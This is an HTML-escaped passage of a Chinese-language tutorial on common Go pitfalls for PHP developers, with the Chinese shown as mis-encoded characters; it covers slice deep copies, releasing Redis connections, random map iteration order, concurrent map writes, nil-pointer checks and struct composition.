&lt;span&gt;uint16&lt;/span&gt;&lt;br/&gt;    hash0     &lt;span&gt;uint32&lt;/span&gt;&lt;br/&gt;&lt;br/&gt;    buckets    unsafe.Pointer &lt;span&gt;// å®é™…å­˜å‚¨å€¼çš„ç±»å‹æ˜¯ä¸ªæŒ‡é’ˆ&lt;/span&gt;&lt;br/&gt;    oldbuckets unsafe.Pointer&lt;br/&gt;    nevacuate  &lt;span&gt;uintptr&lt;/span&gt;  &lt;br/&gt;&lt;br/&gt;    extra *mapextra&lt;br/&gt;}&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;&lt;/code&gt;&lt;/pre&gt;&lt;blockquote data-line=&quot;354&quot;&gt;&lt;p data-line=&quot;354&quot;&gt;&lt;span&gt;æ€ä¹ˆåŠï¼Ÿ&lt;/span&gt;&lt;/p&gt;&lt;/blockquote&gt;&lt;pre&gt;&lt;code data-line=&quot;356&quot;&gt;&lt;code&gt;&lt;p&gt;&lt;span&gt;ç­”ï¼šæ·±æ‹·è´ï¼Œå¼€è¾Ÿä¸€å—æ–°å†…å­˜ï¼ŒæŒ‡é’ˆæŒ‡å‘æ–°å†…å­˜åœ°å€ï¼Œå¹¶æŠŠåŸæœ‰çš„å€¼å¤åˆ¶è¿‡å»ã€‚å¦‚ä¸‹ï¼š&lt;/span&gt;&lt;/p&gt;&lt;/code&gt;&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code data-line=&quot;360&quot;&gt;&lt;p&gt;&lt;span&gt;&lt;span&gt;package&lt;/span&gt; main&lt;br/&gt;&lt;br/&gt;&lt;span&gt;import&lt;/span&gt; &lt;span&gt;&quot;fmt&quot;&lt;/span&gt;&lt;br/&gt;&lt;br/&gt;&lt;span&gt;&lt;span&gt;func&lt;/span&gt; &lt;span&gt;main&lt;/span&gt;&lt;span&gt;()&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;paramDemo := []&lt;span&gt;int32&lt;/span&gt;{&lt;span&gt;1&lt;/span&gt;}&lt;br/&gt;fmt.Println(&lt;span&gt;&quot;main.paramDemo 1&quot;&lt;/span&gt;, paramDemo)&lt;br/&gt;&lt;span&gt;// åˆå§‹åŒ–æ–°ç©ºé—´&lt;/span&gt;&lt;br/&gt;paramDemoCopy := &lt;span&gt;make&lt;/span&gt;([]&lt;span&gt;int32&lt;/span&gt;, &lt;span&gt;len&lt;/span&gt;(paramDemo))&lt;br/&gt;&lt;span&gt;// æ·±æ‹·è´&lt;/span&gt;&lt;br/&gt;&lt;span&gt;copy&lt;/span&gt;(paramDemoCopy, paramDemo)&lt;br/&gt;demo(paramDemoCopy)&lt;br/&gt;fmt.Println(&lt;span&gt;&quot;main.paramDemo 2&quot;&lt;/span&gt;, paramDemo)&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;span&gt;&lt;span&gt;func&lt;/span&gt; &lt;span&gt;demo&lt;/span&gt;&lt;span&gt;(paramDemo []&lt;span&gt;int32&lt;/span&gt;)&lt;/span&gt; &lt;span&gt;([]&lt;span&gt;int32&lt;/span&gt;, error)&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;paramDemo[&lt;span&gt;0&lt;/span&gt;] = &lt;span&gt;2&lt;/span&gt;&lt;br/&gt;&lt;span&gt;return&lt;/span&gt; paramDemo, &lt;span&gt;nil&lt;/span&gt;&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// [Running] go run &quot;.../demo/main.go&quot;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// main.paramDemo 1 [1]&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// main.paramDemo 2 [1]&lt;/span&gt;&lt;br/&gt;&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;&lt;/code&gt;&lt;/pre&gt;&lt;h2 data-line=&quot;387&quot;&gt;&lt;span&gt;3. èµ„æºä½¿ç”¨å®Œæ¯•ï¼Œè®°å¾—é‡Šæ”¾èµ„æºæˆ–å›æ”¶èµ„æº&lt;/span&gt;&lt;/h2&gt;&lt;pre&gt;&lt;code data-line=&quot;389&quot;&gt;&lt;p&gt;&lt;span&gt;&lt;span&gt;package&lt;/span&gt; main&lt;br/&gt;&lt;br/&gt;&lt;span&gt;import&lt;/span&gt; (&lt;br/&gt;&lt;span&gt;&quot;github.com/gomodule/redigo/redis&quot;&lt;/span&gt;&lt;br/&gt;)&lt;br/&gt;&lt;br/&gt;&lt;span&gt;var&lt;/span&gt; RedisPool *redis.Pool&lt;br/&gt;&lt;br/&gt;&lt;span&gt;&lt;span&gt;func&lt;/span&gt; &lt;span&gt;init&lt;/span&gt;&lt;span&gt;()&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;RedisPool = NewRedisPool()&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;span&gt;&lt;span&gt;func&lt;/span&gt; &lt;span&gt;main&lt;/span&gt;&lt;span&gt;()&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;redisConn := RedisPool.Get()&lt;br/&gt;&lt;span&gt;// è®°å¾—deferé‡Šæ”¾èµ„æº&lt;/span&gt;&lt;br/&gt;&lt;span&gt;defer&lt;/span&gt; redisConn.Close()&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;span&gt;&lt;span&gt;func&lt;/span&gt; &lt;span&gt;NewRedisPool&lt;/span&gt;&lt;span&gt;()&lt;/span&gt; *&lt;span&gt;redis&lt;/span&gt;.&lt;span&gt;Pool&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;&lt;span&gt;// ç•¥...&lt;/span&gt;&lt;br/&gt;&lt;span&gt;return&lt;/span&gt; &amp;amp;redis.Pool{}&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;&lt;/code&gt;&lt;/pre&gt;&lt;blockquote data-line=&quot;415&quot;&gt;&lt;p data-line=&quot;415&quot;&gt;&lt;span&gt;ä¸ºä»€ä¹ˆï¼Ÿ&lt;/span&gt;&lt;/p&gt;&lt;/blockquote&gt;&lt;pre&gt;&lt;code data-line=&quot;417&quot;&gt;&lt;code&gt;&lt;p&gt;&lt;span&gt;ç­”ï¼šé¿å…èµ„æºè¢«æ— æ•ˆçš„æŒæœ‰ï¼Œæµªè´¹èµ„æºå’Œå¢åŠ äº†èµ„æºçš„è¿æ¥æ•°ã€‚å…¶æ¬¡å¦‚æœæ˜¯å½’è¿˜è¿æ¥æ± ä¹Ÿå‡å°‘æ–°å»ºèµ„æºçš„å¼€é”€ã€‚&lt;/span&gt;&lt;/p&gt;&lt;/code&gt;&lt;/code&gt;&lt;/pre&gt;&lt;ul class=&quot;list-paddingleft-2&quot;&gt;&lt;li&gt;&lt;p&gt;&lt;span&gt;èµ„æºè¿æ¥æ•°çº¿æ€§å¢é•¿&lt;/span&gt;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;span&gt;å¦‚æœä¸€ç›´æŒæœ‰ï¼Œèµ„æºæœåŠ¡ç«¯ä¹Ÿæœ‰è¶…æ—¶æ—¶é—´&lt;/span&gt;&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 data-line=&quot;424&quot;&gt;&lt;span&gt;4. ä¸è¦ä¾èµ–mapéå†çš„é¡ºåº&lt;/span&gt;&lt;/h2&gt;&lt;p data-line=&quot;426&quot;&gt;&lt;span&gt;ä»¥å¾€PHPçš„â€Mapâ€œ(å…³è”æ•°ç»„)ä¸ç®¡éå†å¤šå°‘æ¬¡ï¼Œå…ƒç´ çš„é¡ºåºéƒ½æ˜¯ç¨³å®šä¸å˜çš„ï¼Œå¦‚ä¸‹ï¼š&lt;/span&gt;&lt;/p&gt;&lt;pre&gt;&lt;code data-line=&quot;427&quot;&gt;&lt;p&gt;&lt;span&gt;&lt;span&gt;&amp;lt;?php&lt;/span&gt;&lt;br/&gt;&lt;br/&gt;&lt;span&gt;$demoMap&lt;/span&gt; = &lt;span&gt;array&lt;/span&gt;(&lt;br/&gt;    &lt;span&gt;&#x27;a&#x27;&lt;/span&gt; =&amp;gt; &lt;span&gt;&#x27;a&#x27;&lt;/span&gt;,&lt;br/&gt;&lt;span&gt;&#x27;b&#x27;&lt;/span&gt; =&amp;gt; &lt;span&gt;&#x27;b&#x27;&lt;/span&gt;,&lt;br/&gt;    &lt;span&gt;&#x27;c&#x27;&lt;/span&gt; =&amp;gt; &lt;span&gt;&#x27;c&#x27;&lt;/span&gt;,&lt;br/&gt;    &lt;span&gt;&#x27;d&#x27;&lt;/span&gt; =&amp;gt; &lt;span&gt;&#x27;d&#x27;&lt;/span&gt;,&lt;br/&gt;    &lt;span&gt;&#x27;e&#x27;&lt;/span&gt; =&amp;gt; &lt;span&gt;&#x27;e&#x27;&lt;/span&gt;,&lt;br/&gt;);&lt;br/&gt;&lt;span&gt;foreach&lt;/span&gt; (&lt;span&gt;$demoMap&lt;/span&gt; &lt;span&gt;as&lt;/span&gt; &lt;span&gt;$v&lt;/span&gt;) {&lt;br/&gt;    var_dump(&lt;span&gt;&quot;v &lt;span&gt;{$v}&lt;/span&gt;&quot;&lt;/span&gt;);&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// ç¬¬ä¸€æ¬¡æ‰§è¡Œ&lt;/span&gt;&lt;br/&gt;[Running] php &lt;span&gt;&quot;.../php/demo.php&quot;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;string&lt;/span&gt;(&lt;span&gt;3&lt;/span&gt;) &lt;span&gt;&quot;v a&quot;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;string&lt;/span&gt;(&lt;span&gt;3&lt;/span&gt;) &lt;span&gt;&quot;v b&quot;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;string&lt;/span&gt;(&lt;span&gt;3&lt;/span&gt;) &lt;span&gt;&quot;v c&quot;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;string&lt;/span&gt;(&lt;span&gt;3&lt;/span&gt;) &lt;span&gt;&quot;v d&quot;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;string&lt;/span&gt;(&lt;span&gt;3&lt;/span&gt;) &lt;span&gt;&quot;v e&quot;&lt;/span&gt;&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// ç¬¬Næ¬¡æ‰§è¡Œ&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// éå†ç»“æœçš„é¡ºåºéƒ½æ˜¯ç¨³å®šä¸å˜çš„&lt;/span&gt;&lt;br/&gt;[Running] php &lt;span&gt;&quot;.../php/demo.php&quot;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;string&lt;/span&gt;(&lt;span&gt;3&lt;/span&gt;) &lt;span&gt;&quot;v a&quot;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;string&lt;/span&gt;(&lt;span&gt;3&lt;/span&gt;) &lt;span&gt;&quot;v b&quot;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;string&lt;/span&gt;(&lt;span&gt;3&lt;/span&gt;) &lt;span&gt;&quot;v c&quot;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;string&lt;/span&gt;(&lt;span&gt;3&lt;/span&gt;) &lt;span&gt;&quot;v d&quot;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;string&lt;/span&gt;(&lt;span&gt;3&lt;/span&gt;) &lt;span&gt;&quot;v e&quot;&lt;/span&gt;&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-line=&quot;459&quot;&gt;&lt;span&gt;ä½†æ˜¯Goè¯­è¨€é‡Œå°±ä¸ä¸€æ ·äº†ï¼Œå¦‚ä¸‹ï¼š&lt;/span&gt;&lt;/p&gt;&lt;pre&gt;&lt;code data-line=&quot;460&quot;&gt;&lt;p&gt;&lt;span&gt;&lt;span&gt;package&lt;/span&gt; main&lt;br/&gt;&lt;br/&gt;&lt;span&gt;import&lt;/span&gt; &lt;span&gt;&quot;fmt&quot;&lt;/span&gt;&lt;br/&gt;&lt;br/&gt;&lt;span&gt;&lt;span&gt;func&lt;/span&gt; &lt;span&gt;main&lt;/span&gt;&lt;span&gt;()&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;&lt;span&gt;var&lt;/span&gt; demoMap &lt;span&gt;map&lt;/span&gt;[&lt;span&gt;string&lt;/span&gt;]&lt;span&gt;string&lt;/span&gt; = &lt;span&gt;map&lt;/span&gt;[&lt;span&gt;string&lt;/span&gt;]&lt;span&gt;string&lt;/span&gt;{&lt;br/&gt;&lt;span&gt;&quot;a&quot;&lt;/span&gt;: &lt;span&gt;&quot;a&quot;&lt;/span&gt;,&lt;br/&gt;&lt;span&gt;&quot;b&quot;&lt;/span&gt;: &lt;span&gt;&quot;b&quot;&lt;/span&gt;,&lt;br/&gt;&lt;span&gt;&quot;c&quot;&lt;/span&gt;: &lt;span&gt;&quot;c&quot;&lt;/span&gt;,&lt;br/&gt;&lt;span&gt;&quot;d&quot;&lt;/span&gt;: &lt;span&gt;&quot;d&quot;&lt;/span&gt;,&lt;br/&gt;&lt;span&gt;&quot;e&quot;&lt;/span&gt;: &lt;span&gt;&quot;e&quot;&lt;/span&gt;,&lt;br/&gt;}&lt;br/&gt;&lt;span&gt;for&lt;/span&gt; _, v := &lt;span&gt;range&lt;/span&gt; demoMap {&lt;br/&gt;fmt.Println(&lt;span&gt;&quot;v&quot;&lt;/span&gt;, v)&lt;br/&gt;}&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// ç¬¬ä¸€æ¬¡æ‰§è¡Œ&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// [Running] go run &quot;.../demo/main.go&quot;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// v a&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// v b&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// v c&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// v d&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// v e&lt;/span&gt;&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// ç¬¬äºŒæ¬¡æ‰§è¡Œ&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// &lt;/span&gt;&lt;/span&gt;&lt;span&gt;éå†ç»“æœï¼Œå…ƒç´ é¡ºåºå‘ç”Ÿäº†æ”¹å˜&lt;/span&gt;&lt;span&gt;&lt;br/&gt;&lt;span&gt;// [Running] go run &quot;.../demo/main.go&quot;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// v e&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// v a&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// v b&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// v c&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// v d&lt;/span&gt;&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;&lt;/code&gt;&lt;/pre&gt;&lt;blockquote data-line=&quot;496&quot;&gt;&lt;p data-line=&quot;496&quot;&gt;&lt;span&gt;ä¸ºä»€ä¹ˆï¼Ÿ&lt;/span&gt;&lt;/p&gt;&lt;/blockquote&gt;&lt;pre&gt;&lt;code data-line=&quot;498&quot;&gt;&lt;code&gt;&lt;p&gt;&lt;span&gt;ç­”ï¼šåº•å±‚å®ç°éƒ½æ˜¯æ•°ç»„+ç±»ä¼¼æ‹‰é“¾æ³•ã€‚&lt;br/&gt;1. hashå‡½æ•°æ— åºå†™å…¥&lt;br/&gt;2. æˆå€æ‰©å®¹&lt;br/&gt;3. ç­‰é‡æ‰©å®¹&lt;br/&gt;éƒ½å†³å®šäº†mapæœ¬æ¥å°±æ˜¯æ— åºçš„ï¼Œæ‰€ä»¥Goè¯­è¨€ä¸ºäº†é¿å…å¼€å‘è€…ä¾èµ–å…ƒç´ é¡ºåºï¼Œæ¯æ¬¡éå†çš„æ—¶å€™éƒ½æ˜¯éšæœºäº†ä¸€ä¸ªç´¢å¼•èµ·å§‹å€¼ã€‚ç„¶åPHPé€šè¿‡é¢å¤–çš„å†…å­˜ç©ºé—´ç»´æŠ¤äº†mapå…ƒç´ çš„é¡ºåºã€‚&lt;/span&gt;&lt;/p&gt;&lt;/code&gt;&lt;/code&gt;&lt;/pre&gt;&lt;h2 data-line=&quot;506&quot;&gt;&lt;span&gt;5. ä¸è¦å¹¶å‘å†™map&lt;/span&gt;&lt;/h2&gt;&lt;pre&gt;&lt;code data-line=&quot;508&quot;&gt;&lt;p&gt;&lt;span&gt;&lt;span&gt;package&lt;/span&gt; main&lt;br/&gt;&lt;br/&gt;&lt;span&gt;import&lt;/span&gt; (&lt;br/&gt;&lt;span&gt;&quot;testing&quot;&lt;/span&gt;&lt;br/&gt;)&lt;br/&gt;&lt;br/&gt;&lt;span&gt;&lt;span&gt;func&lt;/span&gt; &lt;span&gt;BenchmarkDemo&lt;/span&gt;&lt;span&gt;(b *testing.B)&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;&lt;span&gt;var&lt;/span&gt; demoMap &lt;span&gt;map&lt;/span&gt;[&lt;span&gt;string&lt;/span&gt;]&lt;span&gt;string&lt;/span&gt; = &lt;span&gt;map&lt;/span&gt;[&lt;span&gt;string&lt;/span&gt;]&lt;span&gt;string&lt;/span&gt;{&lt;br/&gt;&lt;span&gt;&quot;a&quot;&lt;/span&gt;: &lt;span&gt;&quot;a&quot;&lt;/span&gt;,&lt;br/&gt;&lt;span&gt;&quot;b&quot;&lt;/span&gt;: &lt;span&gt;&quot;b&quot;&lt;/span&gt;,&lt;br/&gt;}&lt;br/&gt;&lt;span&gt;// æ¨¡æ‹Ÿå¹¶å‘å†™map&lt;/span&gt;&lt;br/&gt;b.RunParallel(&lt;span&gt;&lt;span&gt;func&lt;/span&gt;&lt;span&gt;(pb *testing.PB)&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;&lt;span&gt;for&lt;/span&gt; pb.Next() {&lt;br/&gt;demoMap[&lt;span&gt;&quot;a&quot;&lt;/span&gt;] = &lt;span&gt;&quot;aa&quot;&lt;/span&gt;&lt;br/&gt;}&lt;br/&gt;})&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// BenchmarkDemo&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// &lt;/span&gt;&lt;/span&gt;&lt;span&gt;fatal error: concurrent map writes&lt;/span&gt;&lt;span&gt;&lt;br/&gt;// fatal error: concurrent map writes&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;&lt;/code&gt;&lt;/pre&gt;&lt;blockquote data-line=&quot;533&quot;&gt;&lt;p data-line=&quot;533&quot;&gt;&lt;span&gt;ä¸ºä»€ä¹ˆï¼Ÿ&lt;/span&gt;&lt;/p&gt;&lt;/blockquote&gt;&lt;pre&gt;&lt;code data-line=&quot;535&quot;&gt;&lt;code&gt;&lt;p&gt;&lt;span&gt;ç­”ï¼š&lt;/span&gt;&lt;span&gt;å¹¶å‘ä¸å®‰å…¨ï¼Œè§¦å‘panicï¼šâ€œfatal error: concurrent map writesâ€ã€‚&lt;/span&gt;&lt;/p&gt;&lt;/code&gt;&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code data-line=&quot;539&quot;&gt;&lt;p&gt;&lt;span&gt;&lt;span&gt;// go version 1.13.8æºç &lt;/span&gt;&lt;br/&gt;&lt;span&gt;// hashWriting å€¼ä¸º 4&lt;/span&gt;&lt;br/&gt;&lt;span&gt;if&lt;/span&gt; h.flags&amp;amp;hashWriting != &lt;span&gt;0&lt;/span&gt; {&lt;br/&gt;throw(&lt;span&gt;&quot;concurrent map read and map write&quot;&lt;/span&gt;)&lt;br/&gt;}&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;&lt;/code&gt;&lt;/pre&gt;&lt;h2 data-line=&quot;547&quot;&gt;&lt;span&gt;6. æ³¨æ„åˆ¤æ–­æŒ‡é’ˆç±»å‹ä¸ä¸ºç©º&lt;/span&gt;&lt;code&gt;&lt;span&gt;nil&lt;/span&gt;&lt;/code&gt;&lt;span&gt;ï¼Œå†æ“ä½œ&lt;/span&gt;&lt;/h2&gt;&lt;pre&gt;&lt;code data-line=&quot;549&quot;&gt;&lt;p&gt;&lt;span&gt;&lt;span&gt;package&lt;/span&gt; main&lt;br/&gt;&lt;br/&gt;&lt;span&gt;import&lt;/span&gt; (&lt;br/&gt;&lt;span&gt;&quot;fmt&quot;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&quot;log&quot;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&quot;net/http&quot;&lt;/span&gt;&lt;br/&gt;)&lt;br/&gt;&lt;br/&gt;&lt;span&gt;&lt;span&gt;func&lt;/span&gt; &lt;span&gt;main&lt;/span&gt;&lt;span&gt;()&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;resp, err := http.Get(&lt;span&gt;&quot;https://www.example.com&quot;&lt;/span&gt;)&lt;br/&gt;&lt;span&gt;if&lt;/span&gt; resp.StatusCode != http.StatusOK || err != &lt;span&gt;nil&lt;/span&gt; {&lt;br/&gt;&lt;span&gt;// å½“ respä¸ºnilæ—¶ ä¼šè§¦å‘panic&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// å½“ resp.StatusCode != http.StatusOK æ—¶errå¯èƒ½ä¸ºnil è§¦å‘panic&lt;/span&gt;&lt;br/&gt;log.Printf(&lt;span&gt;&quot;err: %s&quot;&lt;/span&gt;, err.Error())&lt;br/&gt;}&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// [Running] go run &quot;.../demo/main.go&quot;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// &lt;/span&gt;&lt;/span&gt;&lt;span&gt;panic: runtime error: invalid memory address or nil pointer dereference&lt;/span&gt;&lt;/p&gt;&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code data-line=&quot;573&quot;&gt;&lt;p&gt;&lt;span&gt;&lt;span&gt;package&lt;/span&gt; main&lt;br/&gt;&lt;br/&gt;&lt;span&gt;import&lt;/span&gt; (&lt;br/&gt;&lt;span&gt;&quot;fmt&quot;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&quot;log&quot;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&quot;net/http&quot;&lt;/span&gt;&lt;br/&gt;)&lt;br/&gt;&lt;br/&gt;&lt;span&gt;&lt;span&gt;func&lt;/span&gt; &lt;span&gt;main&lt;/span&gt;&lt;span&gt;()&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;&lt;span&gt;// æ¨¡æ‹Ÿè¯·æ±‚ä¸šåŠ¡code&lt;/span&gt;&lt;br/&gt;resp, err := http.Get(&lt;span&gt;&quot;https://www.example.com&quot;&lt;/span&gt;)&lt;br/&gt;fmt.Println(resp, err)&lt;br/&gt;&lt;span&gt;if&lt;/span&gt; err != &lt;span&gt;nil&lt;/span&gt; {&lt;br/&gt;&lt;span&gt;// æŠ¥é”™å¹¶è®°å½•å¼‚å¸¸æ—¥å¿—&lt;/span&gt;&lt;br/&gt;log.Printf(&lt;span&gt;&quot;err: %s&quot;&lt;/span&gt;, err.Error())&lt;br/&gt;&lt;span&gt;return&lt;/span&gt;&lt;br/&gt;}&lt;br/&gt;&lt;span&gt;// æ¨¡æ‹Ÿä¸šåŠ¡codeä¸ä¸ºæˆåŠŸçš„code&lt;/span&gt;&lt;br/&gt;&lt;span&gt;if&lt;/span&gt; resp != &lt;span&gt;nil&lt;/span&gt; &amp;amp;&amp;amp; resp.StatusCode != http.StatusOK {&lt;br/&gt;&lt;span&gt;// æŠ¥é”™å¹¶è®°å½•å¼‚å¸¸æ—¥å¿—&lt;/span&gt;&lt;br/&gt;}&lt;br/&gt;}&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;&lt;/code&gt;&lt;/pre&gt;&lt;h2 data-line=&quot;598&quot;&gt;&lt;span&gt;7.Â  Goè¯­è¨€ä¸æ”¯æŒç»§æ‰¿ï¼Œä½†æ˜¯æœ‰åˆæˆå¤ç”¨&lt;/span&gt;&lt;/h2&gt;&lt;pre&gt;&lt;code data-line=&quot;600&quot;&gt;&lt;p&gt;&lt;span&gt;&lt;span&gt;abstract&lt;/span&gt; &lt;span&gt;&lt;span&gt;class&lt;/span&gt; &lt;span&gt;AbstractClassDemo&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;&lt;br/&gt;    &lt;span&gt;// æŠ½è±¡æ–¹æ³•&lt;/span&gt;&lt;br/&gt;    &lt;span&gt;abstract&lt;/span&gt; &lt;span&gt;public&lt;/span&gt; &lt;span&gt;&lt;span&gt;function&lt;/span&gt; &lt;span&gt;demoFun&lt;/span&gt;()&lt;/span&gt;;&lt;br/&gt;    &lt;br/&gt;    &lt;span&gt;// å…¬æœ‰æ–¹æ³•&lt;/span&gt;&lt;br/&gt;    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;&lt;span&gt;function&lt;/span&gt; &lt;span&gt;publicFun&lt;/span&gt;()&lt;br/&gt;    &lt;/span&gt;{&lt;br/&gt;        &lt;span&gt;$this&lt;/span&gt;-&amp;gt;demoFun();&lt;br/&gt;    }&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;span&gt;&lt;span&gt;class&lt;/span&gt; &lt;span&gt;ClassDemo&lt;/span&gt; &lt;span&gt;extends&lt;/span&gt; &lt;span&gt;AbstractClassDemo&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;&lt;br/&gt;    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;&lt;span&gt;function&lt;/span&gt; &lt;span&gt;demoFun&lt;/span&gt;()&lt;br/&gt;    &lt;/span&gt;{&lt;br/&gt;        var_dump(&lt;span&gt;&quot;Demo&quot;&lt;/span&gt;);&lt;br/&gt;    }&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;(&lt;span&gt;new&lt;/span&gt; ClassDemo())-&amp;gt;demoFun();&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// [Running] php &quot;.../php/demo.php&quot;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// string(4) &quot;Demo&quot;&lt;/span&gt;&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code data-line=&quot;627&quot;&gt;&lt;p&gt;&lt;span&gt;&lt;span&gt;package&lt;/span&gt; main&lt;br/&gt;&lt;br/&gt;&lt;span&gt;import&lt;/span&gt; (&lt;br/&gt;&lt;span&gt;&quot;fmt&quot;&lt;/span&gt;&lt;br/&gt;)&lt;br/&gt;&lt;br/&gt;&lt;span&gt;//åŸºç¡€ç»“æ„ä½“&lt;/span&gt;&lt;br/&gt;&lt;span&gt;type&lt;/span&gt; Base &lt;span&gt;struct&lt;/span&gt; {&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// Baseçš„DemoFun&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&lt;span&gt;func&lt;/span&gt; &lt;span&gt;(b *Base)&lt;/span&gt; &lt;span&gt;DemoFun&lt;/span&gt;&lt;span&gt;()&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;fmt.Println(&lt;span&gt;&quot;Base&quot;&lt;/span&gt;)&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;span&gt;&lt;span&gt;func&lt;/span&gt; &lt;span&gt;(b *Base)&lt;/span&gt; &lt;span&gt;PublicFun&lt;/span&gt;&lt;span&gt;()&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;b.DemoFun()&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;span&gt;type&lt;/span&gt; Demo &lt;span&gt;struct&lt;/span&gt; {&lt;br/&gt;&lt;span&gt;// åˆæˆå¤ç”¨Base&lt;/span&gt;&lt;br/&gt;Base&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// Demoçš„DemoFun&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&lt;span&gt;func&lt;/span&gt; &lt;span&gt;(d *Demo)&lt;/span&gt; &lt;span&gt;DemoFun&lt;/span&gt;&lt;span&gt;()&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;fmt.Println(&lt;span&gt;&quot;Demo&quot;&lt;/span&gt;)&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;span&gt;&lt;span&gt;func&lt;/span&gt; &lt;span&gt;main&lt;/span&gt;&lt;span&gt;()&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;&lt;span&gt;// æ‰§è¡Œ&lt;/span&gt;&lt;br/&gt;(&amp;amp;Demo{}).PublicFun()&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// [Running] go run &quot;.../demo/main.go&quot;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// Base &amp;lt;------ æ³¨æ„æ­¤å¤„æ‰§è¡Œçš„æ˜¯è¢«åˆæˆå¤ç”¨çš„ç»“æ„ä½“çš„æ–¹æ³•&lt;/span&gt;&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;&lt;/code&gt;&lt;/pre&gt;&lt;h1 data-line=&quot;666&quot;&gt;&lt;span&gt;è¿›é˜¶ä½¿ç”¨&lt;/span&gt;&lt;/h1&gt;&lt;ol class=&quot;list-paddingleft-2&quot;&gt;&lt;li&gt;&lt;p&gt;&lt;span&gt;&lt;strong&gt;&lt;span&gt;çƒ­åŠ 